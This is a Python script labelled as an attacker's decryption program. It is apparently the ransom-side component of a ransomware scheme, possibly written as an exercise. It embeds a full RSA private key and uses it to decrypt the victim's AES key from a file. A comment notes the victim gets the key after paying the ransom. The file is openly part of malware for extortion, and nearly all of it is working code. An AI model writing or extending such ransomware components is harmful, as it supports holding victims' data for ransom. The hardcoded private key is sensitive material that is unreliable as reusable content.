'''
Attacker's Decryption Program
'''
import sys
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

# =================================
#  PUT dec.key PRIVATE KEY HERE
# =================================
PRIVATE_KEY_DATA = b"""
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDOPhGvdXC7OmLy
x1oHK33Mz97qh9e4d7jFRcg+VCVNmUu9GRwdsfxJnnx+h/KA8/Ga2AJQkM0qyFqo
LrNReLfciwUHWMVmRcTpZ0paFtbzVQmWYHHvk5NwgkuEi4G10+YwFYpwZ3mSIlwG
w8eYOXyb0jUidd3deUTGX9aqNUEPSN9X7udt3W0l99O6/WJ5AcyGJohJto6QFeg5
pr7m0UTPBD0XlTXW4djK7fYGjN7bsVrHHoxvt+bxDU+TaNulwbNpr4BLZ4dmwx3M
oylup+8BhMRsAHPXVUcQxKQ8FcsVdyHDBlXdBPhQzEZF0NZ6ps58Yd8DBndNCidR
laJkSq3rAgMBAAECggEARZ36BkoUNX7t65mTMBxkKIB6dJxKGwB+pEh74V4yAVGf
mUMilHuB96/BwkxNdW3ivivwDBX0y146C89HxFaFabKbjfFPIMioQUkWdfaDtDue
Mt53VzFvcWjp6OHWdPQEHXMH+g1TohprCfWIKEAvacG5Idq7e4j1yCiNo4K6ZVfO
eurQiQrg9hTHbB+BLvyJAvatRFKu3k5T8YAPSzhci4Y8P9qMT8brwuL+AobvMy+m
zqGeaXRBWhf6/pev7sRAo1VS4eJMYXHmjcopC+ViMGdReIvTGMXrFvKLBOzPssax
uFSIh4vkOvj3srC+Jm4vREe65yMnWduF1xoaKMcHMQKBgQDzUlX9vCBboSnic/OR
XR0sGpVXfDbfzs1v87PLYIGfzDVFMkwssvXpMh825QmSEqsj/a0UipA76Ai4a/+O
kqLxbpCHQAWPyftA46MgJtHfB32Z/QMFnnXqggGcSHay+iz4YIP3oZo3mbKGS0Yn
EgapBmAAJ58pMoR2rAC1ftQBxQKBgQDY/SJ3XNoLjz7eosWeTSXHMVzV21ziAiSX
2BsTDj33CTXe8emzu9moPriQXJbt9hmEOYbLnnzIp+9avZBuoPhMdWSodwN3Ndq5
weapC63QN2OyzUPi3Oh7Ziu8k5juOFTTUneegMyKVs5cZHIA6N1d4a/Dg3RIj3Xu
pLPyiIxb7wKBgQDAxdCe7/bq4WpfoOGtnwnHsV/0KdMHyb31HiypylGoGo9xvQGg
wEAXesBEK31Dn0q7fvUrOwQ+kfymr9mOSRqTELesj8pYOvu2UyMgC+FmQ3b9Evjb
8MkW+9zuxnJUJeSO+1hSTlPyDPDleKmhtqRUMVrJhJqSdxV/N5JwOIUayQKBgBQm
fbrj7oPAS7BVIVDwDSAQX3SkqF18oXVQZkNAwVRdkJkhkfhU64OKP414a7OxdPEo
fnIOR7xCjCG7FNyRKj2/cReL5dB+Oc+iSA9OvFdnrWR/V1yL8zLybAFZG4yTwpzV
PbKEd3opUYSW91dKSLRdLvtTC8tpNyRwOx28vHwVAoGBAL2GXaMz+cnE7sUrzPqH
SGyPp58xlNCY9yH2gzV72tFHhKAeWtgtIPad25H+fZsYQJVPlyqe5MCeeQ8vqugF
Q6aB9bzBpf5C1Oy9sN7hqM+e7z5427pXxr6SAaGZV/zNJL3qBsrs9q3y2fqrGoz5
kA0SM9zHDCxvEJpiFbiCkde4
-----END PRIVATE KEY-----
"""

def main():
    if len(sys.argv) != 2:
        print("Usage: python AD.py EncryptedSharedKey")
        return

    enc_file = sys.argv[1]

    # Load private key
    private_key = serialization.load_pem_private_key(
        PRIVATE_KEY_DATA,
        password=None
    )

    # Read encrypted shared key
    with open(enc_file, "rb") as f:
        encrypted_shared_key = f.read()

    # Decrypt AES key
    shared_key = private_key.decrypt(
        encrypted_shared_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Print to stdout (victim receives this after ransom payment)
    print(shared_key.decode())

if __name__ == "__main__":
    main()
